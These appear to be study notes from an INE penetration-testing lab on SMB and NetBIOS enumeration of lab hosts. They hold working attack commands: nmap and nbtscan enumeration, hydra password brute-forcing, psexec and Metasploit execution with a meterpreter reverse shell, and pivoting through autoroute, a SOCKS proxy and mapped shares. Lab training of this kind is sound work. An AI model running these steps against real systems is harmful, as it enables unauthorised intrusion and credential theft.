# SMB & NetBIOS Enumeration

NetBIO: Network Baisc Input/Output System

```
cat /etc/hosts
```
we have to pivot on to the 2nd system 

```
nmap demo.ine.local
```

`Nbtscan`:
```
whatis nbtscan
nbtscan 10.10.4.0/24
nbtscan 10.4.30.0/24
```
Alternate:
`Nmblookup`
```
nmblookup -A 10.4.30.139

nmap -sU -p 137 10.4.30.139

nmap -sU -sV -T4 -p 137 --script nbstat.nse 10.4.30.139
```

### SMB Enumeration:
```
nmap -sV -p 139,445 demo.ine.local

nmap -p 445 --script smb-protocols demo.ine.local
```
```
nmap -p 445 --script smb-security-mode demo.ine.local
```
tells the security level of smb

```
smbclient -L demo.ine.local
<try null password " ">
```

Enumerating user names on windows 
```
nmap -p445 --script smb-enum-users.nse 10.4.30.139
```

Trying Bruteforce on found credentials

```
nano users.txt

hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb	
```

Using `Psexec`
```
psexec.py administrator@demo.ine.local

	>whoami
```
alternatively Can also use `Metasploit Module`

```
msfconsole

search psexec
use exploit/windows/smb/psexec
set RHOSTS
set SMBUser administrator
set SMBPass password1
run

setting paylaod to 64 bit

set payload windows/x64/meterpreter/reverse_tcp

	> sysinfo
	> ctrl+c
```

### Now Pivoting:

```meterpreter
run autoroute -s 10.4.26.0/20
background

search socks_proxy
use 0
set VERSION 4a
set SRVPORT 9050
run
```

Confirm:
```linux
netstar -antp
<see 0.0.0.0:9050

proxychains nmap demo.ine.local -sT -Pn -sV -p 445
```

Back to meterpreter
```meterpreter
sessions <id>

shell
	net view 10.4.26.4
migrate -N explorer.exe
shell
	net view 10.4.26.4
	
	net use D: \\10.4.26.4 \\Documents
	net use K: \\10.4.26.4 \\K
	dir D:
	dir K:
	


```
<demo1.ine.local> ip
